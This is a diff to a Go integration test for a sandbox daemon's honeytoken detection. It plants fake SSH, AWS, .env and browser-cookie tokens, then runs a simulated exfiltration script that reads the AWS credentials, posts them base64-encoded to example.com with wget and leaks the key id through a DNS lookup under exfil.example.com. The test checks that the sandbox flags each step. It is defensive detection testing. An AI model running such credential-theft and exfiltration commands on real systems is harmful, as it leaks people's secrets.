@@ -88,12 +88,13 @@ func TestITestDaemonNetwork(t *testing.T) {
 	defer func() { _ = conn.Close() }()
 	h := &harness{client: qtdv1.NewSandboxServiceClient(conn), wait: 3 * time.Minute}
 
+	honeytokens := false
 	create := func(img string, np *qtdv1.NetPolicy) string {
 		t.Helper()
 		cctx, ccancel := context.WithTimeout(context.Background(), 5*time.Minute)
 		defer ccancel()
 		resp, err := h.client.Create(cctx, &qtdv1.CreateRequest{
-			Image: img, Net: np,
+			Image: img, Net: np, Honeytokens: honeytokens,
 			Limits: &qtdv1.Limits{CpuMillis: 1000, MemoryBytes: 512 << 20, Pids: 128},
 		})
 		if err != nil {
@@ -146,7 +147,7 @@ ssl.create_default_context().wrap_socket(s, server_hostname='example.com')
 
 	check := func(id string, wants [][]string) {
 		t.Helper()
-		evs, err := readEvents(t, h, &qtdv1.EventsRequest{SandboxId: id, Kinds: []string{"net", "dns", "policy_denied"}})
+		evs, err := readEvents(t, h, &qtdv1.EventsRequest{SandboxId: id, Kinds: []string{"net", "dns", "policy_denied", "honeytoken"}})
 		if err != nil {
 			t.Fatal(err)
 		}
@@ -194,8 +195,56 @@ ssl.create_default_context().wrap_socket(s, server_hostname='example.com')
 		{`"kind":"net"`, `"op":"close"`, `"sni":"example.com"`, `"bytes_in":`, `"duration_ms":`},
 	})
 
+	// Honeytokens: planted as the sandbox user, invisible to diff until changed; reading one
+	// is an event, sending one anywhere is a red flag.
+	honeytokens = true
+	honey := create("python:3.13-alpine", &qtdv1.NetPolicy{Mode: qtdv1.NetPolicy_MODE_LOG})
+	r = sh(honey, `cd "$HOME"; stat -c '%U %a %n' .ssh/id_ed25519 .aws/credentials .env .config/google-chrome/Default/Cookies
+python3 -c "import sqlite3,os; c=sqlite3.connect(os.path.expanduser('~/.config/google-chrome/Default/Cookies')); print(c.execute('select count(*), min(host_key) from cookies').fetchone())"`)
+	if r.exit.GetCode() != 0 || strings.Count(r.stdout, "nobody 600 ") != 4 || !strings.Contains(r.stdout, "(2, '.amazon.com')") {
+		t.Errorf("planted honeytokens: %+v", r)
+	}
+	diff, err := h.client.Diff(context.Background(), &qtdv1.DiffRequest{SandboxId: honey})
+	if err != nil {
+		t.Fatal(err)
+	}
+	for _, c := range diff.GetChanges() {
+		if strings.Contains(c.GetPath(), ".aws") || strings.Contains(c.GetPath(), ".ssh") || strings.HasSuffix(c.GetPath(), "/.env") {
+			t.Errorf("diff shows a planted token: %v", c)
+		}
+	}
+	r = sh(honey, `cat ~/.aws/credentials >/dev/null
+id=$(awk '/aws_access_key_id/ {print tolower($3)}' ~/.aws/credentials)
+wget -q -T 5 -O /dev/null --post-data "c=$(base64 -w0 ~/.aws/credentials)" http://example.com/ 2>/dev/null
+nslookup "$id.exfil.example.com" >/dev/null 2>&1
+echo leaked >> ~/.env; true`)
+	if r.exit.GetCode() != 0 {
+		t.Errorf("exfil script: %+v", r)
+	}
+	time.Sleep(2500 * time.Millisecond) // the gvisor file events flush after 2 s
+	check(honey, [][]string{
+		{`"kind":"honeytoken"`, `"trigger":"read"`, `"token_kind":"aws_credentials"`, `"related_event":"ev_`},
+		{`"kind":"honeytoken"`, `"trigger":"read"`, `"token_kind":"browser_cookies"`},
+		{`"kind":"honeytoken"`, `"trigger":"egress_plaintext"`, `"token_kind":"aws_credentials"`, `"dst":"example.com"`},
+		{`"kind":"honeytoken"`, `"trigger":"egress_dns"`, `"token_kind":"aws_credentials"`, `.exfil.example.com"`},
+	})
+	diff, err = h.client.Diff(context.Background(), &qtdv1.DiffRequest{SandboxId: honey})
+	if err != nil {
+		t.Fatal(err)
+	}
+	changedEnv := false
+	for _, c := range diff.GetChanges() {
+		changedEnv = changedEnv || strings.HasSuffix(c.GetPath(), "/.env")
+	}
+	if !changedEnv {
+		t.Errorf("diff hides a modified token: %v", diff.GetChanges())
+	}
+	if _, err := os.Stat(filepath.Join(data, "sandboxes", honey, "honeytokens.json")); err != nil {
+		t.Error(err)
+	}
+
 	// rm leaves no link, namespace or proxy behind.
-	for _, id := range []string{allow, logged} {
+	for _, id := range []string{allow, logged, honey} {
 		if _, err := h.client.Destroy(context.Background(), &qtdv1.DestroyRequest{SandboxId: id}); err != nil {
 			t.Fatalf("rm %s: %v", id, err)
 		}
